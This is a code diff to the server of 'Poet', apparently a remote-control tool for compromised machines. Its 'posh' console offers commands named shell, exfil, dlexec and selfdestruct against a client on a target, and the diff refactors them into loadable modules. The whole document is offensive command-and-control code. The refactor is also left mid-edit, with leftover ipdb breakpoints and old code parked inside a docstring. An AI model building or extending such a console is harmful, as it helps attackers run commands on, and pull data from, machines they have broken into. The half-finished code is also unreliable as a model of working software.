@@ -9,8 +9,10 @@ import socket
 import os.path
 import argparse
 from datetime import datetime
+from importlib import import_module
 
 import debug
+import module
 import config as CFG
 from poetsocket import *
 
@@ -53,29 +55,18 @@ class PoetServer(object):
     def __init__(self, s):
         self.s = s
         self.conn = None
-        self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
-                     'selfdestruct', 'dlexec', 'chint']
+        # self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
+        #              'selfdestruct', 'dlexec', 'chint']
+        self.builtins = ['exit', 'help']
+
+        # load modules
+        import ipdb; ipdb.set_trace()
+        self.cmds, self.mods = module.load_modules(self.builtins)
+
 
     def start(self):
         """Poet server control shell."""
-
-        debug.info('Entering control shell')
-        self.conn = PoetSocket(self.s.accept()[0])
-        prompt = self.conn.exchange('getprompt')
-        print 'Welcome to posh, the Poet Shell!'
-        print 'Running `help\' will give you a list of supported commands.'
-        while True:
-            try:
-                inp = raw_input(POSH_PROMPT)
-                if inp == '':
-                    continue
-                base = inp.split()[0]
-                # exit
-                if base == self.cmds[0]:
-                    break
-                # help
-                elif base == self.cmds[1]:
-                    print 'Commands:\n  {}'.format('\n  '.join(sorted(self.cmds)))
+        """
                 # exec
                 elif base == self.cmds[2]:
                     inp += ' '  # for regex
@@ -118,8 +109,8 @@ class PoetServer(object):
                 # selfdestruct
                 elif base == self.cmds[6]:
                     if inp == 'selfdestruct':
-                        print """[!] WARNING: You are about to permanently remove the client from the target.
-    You will immediately lose access to the target. Continue? (y/n)""",
+                        print [!] WARNING: You are about to permanently remove the client from the target.
+    You will immediately lose access to the target. Continue? (y/n),
                         if raw_input().lower()[0] == 'y':
                             resp = self.conn.exchange('selfdestruct')
                             if resp == 'boom':
@@ -145,8 +136,37 @@ class PoetServer(object):
                         self.chint(inp)
                     else:
                         self.cmd_help(8)
-                else:
-                    print 'posh: {}: command not found'.format(base)
+            """
+
+        debug.info('Entering control shell')
+        self.conn = PoetSocket(self.s.accept()[0])
+        prompt = self.conn.exchange('getprompt')
+        print 'Welcome to posh, the Poet Shell!'
+        print 'Running `help\' will give you a list of supported commands.'
+        while True:
+            try:
+                found = False
+                argv = raw_input(POSH_PROMPT).split()
+                import ipdb; ipdb.set_trace()
+
+                # builtins
+                if argv == []:
+                    continue
+                # exit
+                if argv[0] == self.cmds[0]:
+                    break
+                # help
+                elif argv[0] == self.cmds[1]:
+                    found = True
+                    print 'Commands:\n  {}'.format('\n  '.join(sorted(self.cmds)))
+                
+                for mod in self.mods:
+                    if argv[0] == mod.__name__.split('.')[-1]:
+                        found = True
+                        mod.server(argv, self.conn)
+
+                if not found:
+                    print 'posh: {}: command not found'.format(argv[0])
             except KeyboardInterrupt:
                 print
                 continue
@@ -472,8 +492,8 @@ def main():
             try:
                 PoetServer(s).start()
                 break
-            except socket.error as e:
-                die('Socket error: {}'.format(e.message))
+            except Exception as e:
+                die('Fatal error: {}'.format(e.message))
     die()
 
 if __name__ == '__main__':
